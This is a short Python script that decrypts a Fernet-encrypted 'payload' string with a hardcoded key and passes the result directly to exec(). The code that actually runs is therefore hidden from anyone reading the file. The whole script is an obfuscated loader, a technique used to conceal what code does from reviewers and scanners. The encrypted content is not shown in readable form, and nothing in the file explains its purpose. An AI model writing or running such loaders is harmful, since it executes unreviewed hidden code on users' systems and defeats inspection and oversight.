import base64
from cryptography.fernet import Fernet



payload = b'gAAAAABiMD1Ju5_eZeZy7C03K_YcWGDGXfvy5A9b5HzV-uZIYN8syTFGHgLwoRonYtCS0WcDrufxRRXlvNKtyEMqMS0AADLcRNr6VYpLLbKaETF37L22GEg1ok8NutHXK6gy47sBLmxmWWU729b86rzK6IMc2Kg-CR0bMm_fzrbRrWEYSk0WRNnKxy7Juuy-Ss2RjbACKgbwL7HNGATu3hYuPflf3PCKztLRFXCBxijKncKZgt68wYhGnPAzYvUVrdhhtMg9ra7ZKIirltPfKC8iX2DqmR9vVA=='

key_str = 'correctstaplecorrectstaplecorrec'
key_base64 = base64.b64encode(key_str.encode())
f = Fernet(key_base64)
plain = f.decrypt(payload)
exec(plain.decode())
